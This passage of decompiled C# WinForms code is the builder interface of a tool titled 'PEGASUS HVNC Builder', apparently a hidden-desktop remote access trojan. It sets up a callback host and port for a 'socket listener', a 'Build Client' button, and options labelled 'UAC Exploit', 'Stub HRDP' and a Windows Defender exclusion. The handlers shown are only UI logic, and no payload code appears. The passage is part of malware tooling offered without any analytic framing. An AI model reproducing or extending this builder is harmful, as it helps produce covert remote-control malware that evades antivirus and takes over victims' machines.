			guna2Button1.DisabledState.Parent = guna2Button1;
			guna2Button1.FillColor = System.Drawing.Color.Black;
			guna2Button1.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			guna2Button1.ForeColor = System.Drawing.Color.White;
			guna2Button1.HoverState.BorderColor = System.Drawing.Color.White;
			guna2Button1.HoverState.FillColor = System.Drawing.Color.Black;
			guna2Button1.HoverState.Parent = guna2Button1;
			guna2Button1.Location = new System.Drawing.Point(115, 131);
			guna2Button1.Name = "guna2Button1";
			guna2Button1.PressedColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2Button1.ShadowDecoration.Parent = guna2Button1;
			guna2Button1.Size = new System.Drawing.Size(79, 24);
			guna2Button1.TabIndex = 133;
			guna2Button1.Text = "Static";
			guna2HtmlToolTip1.SetToolTip(guna2Button1, "Set your static IP!");
			guna2Button1.Click += new System.EventHandler(guna2Button1_Click);
			label13.AutoSize = true;
			label13.BackColor = System.Drawing.Color.Transparent;
			label13.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label13.Location = new System.Drawing.Point(598, 11);
			label13.Name = "label13";
			label13.Size = new System.Drawing.Size(109, 16);
			label13.TabIndex = 2;
			label13.Text = "Identifier Settings";
			label13.Visible = false;
			txtIP.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			txtIP.Cursor = System.Windows.Forms.Cursors.IBeam;
			txtIP.DefaultText = "IP ADDRESS";
			txtIP.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			txtIP.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			txtIP.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			txtIP.DisabledState.Parent = txtIP;
			txtIP.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			txtIP.FillColor = System.Drawing.Color.Black;
			txtIP.FocusedState.BorderColor = System.Drawing.Color.White;
			txtIP.FocusedState.Parent = txtIP;
			txtIP.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			txtIP.ForeColor = System.Drawing.Color.White;
			txtIP.HoverState.BorderColor = System.Drawing.Color.White;
			txtIP.HoverState.Parent = txtIP;
			txtIP.Location = new System.Drawing.Point(26, 70);
			txtIP.Name = "txtIP";
			txtIP.PasswordChar = '\0';
			txtIP.PlaceholderForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			txtIP.PlaceholderText = "";
			txtIP.SelectedText = "";
			txtIP.SelectionStart = 10;
			txtIP.ShadowDecoration.Parent = txtIP;
			txtIP.Size = new System.Drawing.Size(167, 24);
			txtIP.TabIndex = 131;
			txtPORT.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			txtPORT.Cursor = System.Windows.Forms.Cursors.IBeam;
			txtPORT.DefaultText = "4448";
			txtPORT.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			txtPORT.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			txtPORT.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			txtPORT.DisabledState.Parent = txtPORT;
			txtPORT.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			txtPORT.FillColor = System.Drawing.Color.Black;
			txtPORT.FocusedState.BorderColor = System.Drawing.Color.White;
			txtPORT.FocusedState.Parent = txtPORT;
			txtPORT.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			txtPORT.ForeColor = System.Drawing.Color.White;
			txtPORT.HoverState.BorderColor = System.Drawing.Color.White;
			txtPORT.HoverState.Parent = txtPORT;
			txtPORT.Location = new System.Drawing.Point(26, 201);
			txtPORT.Name = "txtPORT";
			txtPORT.PasswordChar = '\0';
			txtPORT.PlaceholderText = "";
			txtPORT.SelectedText = "";
			txtPORT.ShadowDecoration.Parent = txtPORT;
			txtPORT.Size = new System.Drawing.Size(167, 24);
			txtPORT.TabIndex = 132;
			guna2HtmlToolTip1.SetToolTip(txtPORT, "Socket listener!");
			label2.AutoSize = true;
			label2.BackColor = System.Drawing.Color.Transparent;
			label2.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label2.Location = new System.Drawing.Point(23, 182);
			label2.Name = "label2";
			label2.Size = new System.Drawing.Size(134, 16);
			label2.TabIndex = 130;
			label2.Text = "Socket Port Listener :";
			label1.AutoSize = true;
			label1.BackColor = System.Drawing.Color.Transparent;
			label1.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label1.Location = new System.Drawing.Point(23, 51);
			label1.Name = "label1";
			label1.Size = new System.Drawing.Size(97, 16);
			label1.TabIndex = 129;
			label1.Text = "Host IP / DNS :";
			guna2CustomCheckBox1.BackColor = System.Drawing.Color.Black;
			guna2CustomCheckBox1.CheckedState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2CustomCheckBox1.CheckedState.BorderRadius = 2;
			guna2CustomCheckBox1.CheckedState.BorderThickness = 2;
			guna2CustomCheckBox1.CheckedState.FillColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2CustomCheckBox1.CheckedState.Parent = guna2CustomCheckBox1;
			guna2CustomCheckBox1.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			guna2CustomCheckBox1.ForeColor = System.Drawing.Color.White;
			guna2CustomCheckBox1.Location = new System.Drawing.Point(222, 495);
			guna2CustomCheckBox1.Name = "guna2CustomCheckBox1";
			guna2CustomCheckBox1.ShadowDecoration.Parent = guna2CustomCheckBox1;
			guna2CustomCheckBox1.Size = new System.Drawing.Size(23, 23);
			guna2CustomCheckBox1.TabIndex = 126;
			guna2CustomCheckBox1.Text = "guna2CustomCheckBox1";
			guna2CustomCheckBox1.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2CustomCheckBox1.UncheckedState.BorderRadius = 2;
			guna2CustomCheckBox1.UncheckedState.BorderThickness = 2;
			guna2CustomCheckBox1.UncheckedState.FillColor = System.Drawing.Color.Black;
			guna2CustomCheckBox1.UncheckedState.Parent = guna2CustomCheckBox1;
			guna2CustomCheckBox1.Visible = false;
			chkHRDP.BackColor = System.Drawing.Color.Black;
			chkHRDP.CheckedState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			chkHRDP.CheckedState.BorderRadius = 2;
			chkHRDP.CheckedState.BorderThickness = 2;
			chkHRDP.CheckedState.FillColor = System.Drawing.Color.FromArgb(9, 248, 121);
			chkHRDP.CheckedState.Parent = chkHRDP;
			chkHRDP.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			chkHRDP.ForeColor = System.Drawing.Color.White;
			chkHRDP.Location = new System.Drawing.Point(222, 469);
			chkHRDP.Name = "chkHRDP";
			chkHRDP.ShadowDecoration.Parent = chkHRDP;
			chkHRDP.Size = new System.Drawing.Size(23, 23);
			chkHRDP.TabIndex = 126;
			chkHRDP.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			chkHRDP.UncheckedState.BorderRadius = 2;
			chkHRDP.UncheckedState.BorderThickness = 2;
			chkHRDP.UncheckedState.FillColor = System.Drawing.Color.Black;
			chkHRDP.UncheckedState.Parent = chkHRDP;
			chkHRDP.Visible = false;
			chkHRDP.CheckedChanged += new System.EventHandler(HiddenAccess_CheckedChanged);
			label9.AutoSize = true;
			label9.BackColor = System.Drawing.Color.Transparent;
			label9.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label9.ForeColor = System.Drawing.Color.Gainsboro;
			label9.Location = new System.Drawing.Point(250, 498);
			label9.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
			label9.Name = "label9";
			label9.Size = new System.Drawing.Size(78, 16);
			label9.TabIndex = 81;
			label9.Text = "UAC Exploit";
			label9.Visible = false;
			label10.AutoSize = true;
			label10.BackColor = System.Drawing.Color.Transparent;
			label10.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label10.ForeColor = System.Drawing.Color.Gainsboro;
			label10.Location = new System.Drawing.Point(250, 472);
			label10.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
			label10.Name = "label10";
			label10.Size = new System.Drawing.Size(74, 16);
			label10.TabIndex = 81;
			label10.Text = "Stub HRDP";
			label10.Visible = false;
			label17.AutoSize = true;
			label17.BackColor = System.Drawing.Color.Transparent;
			label17.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label17.ForeColor = System.Drawing.Color.Gainsboro;
			label17.Location = new System.Drawing.Point(250, 338);
			label17.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
			label17.Name = "label17";
			label17.Size = new System.Drawing.Size(86, 16);
			label17.TabIndex = 81;
			label17.Text = "WD exclusion";
			guna2HtmlToolTip1.SetToolTip(label17, "Exclude from Windows Defender!");
			WanBtn.Animated = true;
			WanBtn.BackColor = System.Drawing.Color.Black;
			WanBtn.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			WanBtn.BorderThickness = 1;
			WanBtn.CheckedState.Parent = WanBtn;
			WanBtn.CustomImages.Parent = WanBtn;
			WanBtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			WanBtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			WanBtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			WanBtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			WanBtn.DisabledState.Parent = WanBtn;
			WanBtn.FillColor = System.Drawing.Color.Black;
			WanBtn.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			WanBtn.ForeColor = System.Drawing.Color.White;
			WanBtn.HoverState.BorderColor = System.Drawing.Color.White;
			WanBtn.HoverState.FillColor = System.Drawing.Color.Black;
			WanBtn.HoverState.Parent = WanBtn;
			WanBtn.Location = new System.Drawing.Point(26, 101);
			WanBtn.Name = "WanBtn";
			WanBtn.PressedColor = System.Drawing.Color.FromArgb(9, 248, 121);
			WanBtn.ShadowDecoration.Parent = WanBtn;
			WanBtn.Size = new System.Drawing.Size(79, 24);
			WanBtn.TabIndex = 19;
			WanBtn.Text = "WAN";
			guna2HtmlToolTip1.SetToolTip(WanBtn, "Set your wan IP!");
			WanBtn.Click += new System.EventHandler(WanBtn_Click);
			LANBtn.Animated = true;
			LANBtn.BackColor = System.Drawing.Color.Black;
			LANBtn.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			LANBtn.BorderThickness = 1;
			LANBtn.CheckedState.Parent = LANBtn;
			LANBtn.CustomImages.Parent = LANBtn;
			LANBtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			LANBtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			LANBtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			LANBtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			LANBtn.DisabledState.Parent = LANBtn;
			LANBtn.FillColor = System.Drawing.Color.Black;
			LANBtn.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			LANBtn.ForeColor = System.Drawing.Color.White;
			LANBtn.HoverState.BorderColor = System.Drawing.Color.White;
			LANBtn.HoverState.FillColor = System.Drawing.Color.Black;
			LANBtn.HoverState.Parent = LANBtn;
			LANBtn.Location = new System.Drawing.Point(114, 101);
			LANBtn.Name = "LANBtn";
			LANBtn.PressedColor = System.Drawing.Color.FromArgb(9, 248, 121);
			LANBtn.ShadowDecoration.Parent = LANBtn;
			LANBtn.Size = new System.Drawing.Size(79, 24);
			LANBtn.TabIndex = 19;
			LANBtn.Text = "LAN";
			guna2HtmlToolTip1.SetToolTip(LANBtn, "Set your lan IP!");
			LANBtn.Click += new System.EventHandler(LANBtn_Click);
			guna2Separator1.FillColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2Separator1.Location = new System.Drawing.Point(43, 28);
			guna2Separator1.Name = "guna2Separator1";
			guna2Separator1.Size = new System.Drawing.Size(128, 10);
			guna2Separator1.TabIndex = 140;
			guna2Separator2.FillColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2Separator2.Location = new System.Drawing.Point(240, 28);
			guna2Separator2.Name = "guna2Separator2";
			guna2Separator2.Size = new System.Drawing.Size(128, 10);
			guna2Separator2.TabIndex = 141;
			BuildBtn.Animated = true;
			BuildBtn.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			BuildBtn.BorderThickness = 1;
			BuildBtn.CheckedState.Parent = BuildBtn;
			BuildBtn.CustomImages.Parent = BuildBtn;
			BuildBtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			BuildBtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			BuildBtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			BuildBtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			BuildBtn.DisabledState.Parent = BuildBtn;
			BuildBtn.FillColor = System.Drawing.Color.Black;
			BuildBtn.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f);
			BuildBtn.ForeColor = System.Drawing.Color.White;
			BuildBtn.HoverState.BorderColor = System.Drawing.Color.White;
			BuildBtn.HoverState.FillColor = System.Drawing.Color.Black;
			BuildBtn.HoverState.Parent = BuildBtn;
			BuildBtn.Location = new System.Drawing.Point(8, 570);
			BuildBtn.Name = "BuildBtn";
			BuildBtn.ShadowDecoration.Parent = BuildBtn;
			BuildBtn.Size = new System.Drawing.Size(412, 43);
			BuildBtn.TabIndex = 19;
			BuildBtn.Text = "Build Client";
			BuildBtn.Click += new System.EventHandler(button1_Click);
			guna2BorderlessForm1.ContainerControl = this;
			guna2BorderlessForm1.DockIndicatorTransparencyValue = 0.6;
			guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2BorderlessForm1.TransparentWhileDrag = true;
			guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2ShadowForm1.TargetForm = this;
			guna2HtmlToolTip1.AllowLinksHandling = true;
			guna2HtmlToolTip1.BackColor = System.Drawing.Color.Black;
			guna2HtmlToolTip1.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2HtmlToolTip1.ForeColor = System.Drawing.Color.White;
			guna2HtmlToolTip1.MaximumSize = new System.Drawing.Size(0, 0);
			guna2HtmlToolTip1.TitleFont = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			guna2HtmlToolTip1.TitleForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2HtmlToolTip1.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info;
			guna2HtmlToolTip1.ToolTipTitle = "PEGASUS";
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			BackColor = System.Drawing.Color.Black;
			base.ClientSize = new System.Drawing.Size(430, 625);
			base.Controls.Add(panel1);
			base.Controls.Add(BuildBtn);
			base.Controls.Add(guna2GroupBox1);
			DoubleBuffered = true;
			ForeColor = System.Drawing.Color.GhostWhite;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "FrmBuilder";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			Text = "PEGASUS HVNC Builder";
			base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(FrmBuilder_FormClosing);
			base.Load += new System.EventHandler(FrmBuilder_Load);
			panel1.ResumeLayout(false);
			panel1.PerformLayout();
			((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
			guna2GroupBox1.ResumeLayout(false);
			guna2GroupBox1.PerformLayout();
			ResumeLayout(false);
		}

		private void guna2Button1_Click(object sender, EventArgs e)
		{
			using Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.IP);
			socket.Connect("8.8.8.8", 65530);
			IPEndPoint iPEndPoint = socket.LocalEndPoint as IPEndPoint;
			string text = iPEndPoint.Address.ToString();
			txtIP.Text = string.Empty;
			txtIP.Text = text;
		}

		[DllImport("user32.DLL")]
		private static extern void ReleaseCapture();

		[DllImport("user32.DLL")]
		private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

		private void label18_MouseDown(object sender, MouseEventArgs e)
		{
			ReleaseCapture();
			SendMessage(base.Handle, 274, 61458, 0);
		}

		private void chkCplus_CheckedChanged(object sender, EventArgs e)
		{
			if (chkCplus.Checked)
			{
				txtIdentifier.Text = "C++";
				chkHRDP.Enabled = false;
				chkC.Enabled = false;
			}
			else
			{
				chkHRDP.Enabled = true;
				chkC.Enabled = true;
			}
		}

		private void chkC_CheckedChanged(object sender, EventArgs e)
		{
			if (chkC.Checked)
			{
				txtIdentifier.Text = "C#";
				chkHRDP.Enabled = false;
				chkCplus.Enabled = false;
			}
			else
			{
				chkHRDP.Enabled = true;
				chkCplus.Enabled = true;
			}
		}

		private void HiddenAccess_CheckedChanged(object sender, EventArgs e)
		{
			if (chkHRDP.Checked)
			{
				txtIdentifier.Text = "HRDP";
				chkC.Enabled = false;
				chkCplus.Enabled = false;
			}
			else
			{
				chkC.Enabled = true;
				chkCplus.Enabled = true;
			}
		}
	}
}
